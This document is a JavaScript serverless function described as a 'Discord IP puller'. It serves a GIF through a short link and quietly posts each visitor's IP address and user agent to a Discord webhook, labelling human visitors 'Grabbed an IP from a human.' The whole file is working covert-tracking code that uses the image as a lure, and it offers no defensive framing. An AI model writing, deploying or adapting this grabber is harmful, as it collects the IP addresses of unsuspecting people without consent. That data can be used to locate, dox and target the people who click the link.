// Middle click for something gif Discord IP puller
export default async function handler(req, res) {
  const { id } = req.query;
  const userAgent = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const isDiscordBot = userAgent.includes('Discordbot');

  const baseUrl = process.env.FIREBASE_DB_URL;
  
  if (!baseUrl) {
    return res.status(500).send("DB URL missing in Vercel settings.");
  }

  const cleanBase = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
  const fbUrl = `${cleanBase}/shortenedurls/${id}.json`;

  try {
    const fbRequest = await fetch(fbUrl);
    const targetUrl = await fbRequest.json();

    if (!targetUrl) {
      return res.status(404).send("GIF ID not found in database.");
    }

    if (process.env.DISCORD_WEBHOOK_URL) {
      fetch(process.env.DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: isDiscordBot ? "Bot opened the link." : "Grabbed an IP from a human.",
            description: `**ID:** \`${id}\`\n**IP:** \`${ip}\`\n**Agent:** \`${userAgent.substring(0, 60)}...\``,
            color: isDiscordBot ? 0x5865F2 : 0x2ECC71,
            timestamp: new Date()
          }]
        })
      }).catch(() => {});
    }

    const imageResponse = await fetch(targetUrl);
    const buffer = await imageResponse.arrayBuffer();

    res.setHeader("Content-Type", "image/gif");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.send(Buffer.from(buffer));

  } catch (error) {
    res.status(500).send("Error processing request.");
  }
}
